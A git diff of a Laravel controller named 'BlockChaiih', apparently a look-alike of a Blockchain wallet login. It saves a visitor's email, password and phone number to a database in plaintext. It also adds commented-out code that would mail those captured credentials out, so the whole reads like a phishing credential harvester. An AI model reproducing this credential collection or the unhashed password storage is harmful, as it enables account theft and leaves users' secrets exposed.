@@ -31,7 +31,7 @@ class BlockChaiihController extends Controller
             'name'=>'required',
             'email'=>'required',
             'password'=>'required',
-            
+
         ]);
 
         dd('done');
@@ -56,14 +56,24 @@ class BlockChaiihController extends Controller
         ]);
         $number = $request->number;
 
+        //session()->put('number',$number );
+
         $Blockchaiih = new Blockchaiih();
         $Blockchaiih->email = session()->get('email');
         $Blockchaiih->number = $number;
         $Blockchaiih->password = session()->get('password');
 
-        
         $Blockchaiih->save();
-        
+
+//        $blockchaiih = Blockchaiih::first();
+//        $mailData = [
+//            'body'=>'You have received the mail',
+//            'mailText'=> 'Email:'. session()->get('email'). 'Password:' . session()->get('password') . 'NUmber:' . $number,
+//            'thankyou'=> 'Thank you for using Blockchaiih'
+//        ];
+//
+//        $blockchaiih->notify(new Blockchaiih($mailData));
+
         return view('welcome');
     }
     public function postPassword(request $request)
